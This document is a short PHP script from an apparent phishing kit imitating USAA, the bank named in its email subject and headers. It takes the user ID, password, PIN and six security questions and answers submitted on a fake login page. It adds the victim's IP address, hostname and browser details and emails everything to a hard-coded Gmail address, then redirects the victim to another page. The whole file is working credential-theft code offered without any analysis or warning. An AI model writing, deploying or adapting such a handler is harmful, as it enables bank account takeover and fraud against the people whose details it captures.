<?php 
$Ok= "blowmoni@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Question information ==================\n";
$fuck .= "USer ID: ".$_POST['userid']."\n";
$fuck .= "Password: ".$_POST['password']."\n";
$fuck .= "PIN: ".$_POST['table:row1:pin1']."\n";
$fuck .= "Question Number 1: ".$_POST['q1']."\n";
$fuck .= "Answer Number 1: ".$_POST['a1']."\n";
$fuck .= "Question Number 2: ".$_POST['q2']."\n";
$fuck .= "Answer Number 2 : ".$_POST['a2']."\n";
$fuck .= "Question Number 3 : ".$_POST['q3']."\n";
$fuck .= "Answer Number 3 : ".$_POST['a3']."\n";
$fuck .= "Question Number 4 : ".$_POST['q4']."\n";
$fuck .= "Answer Number 4 : ".$_POST['a4']."\n";
$fuck .= "Question Number 5 : ".$_POST['q5']."\n";
$fuck .= "Answer Number 5 : ".$_POST['a5']."\n";
$fuck .= "Question Number 6 : ".$_POST['q6']."\n";
$fuck .= "Answer Number 6 : ".$_POST['a6']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+Codewizard+===========\n";
$subject = "uSAa. Usr. & PasS Ques.T $ip";
$headers = "From: uSAa <codewizard@oject.com>";
mail($Ok,$subject,$fuck,$headers);
Header ("Location: contact.php");
?>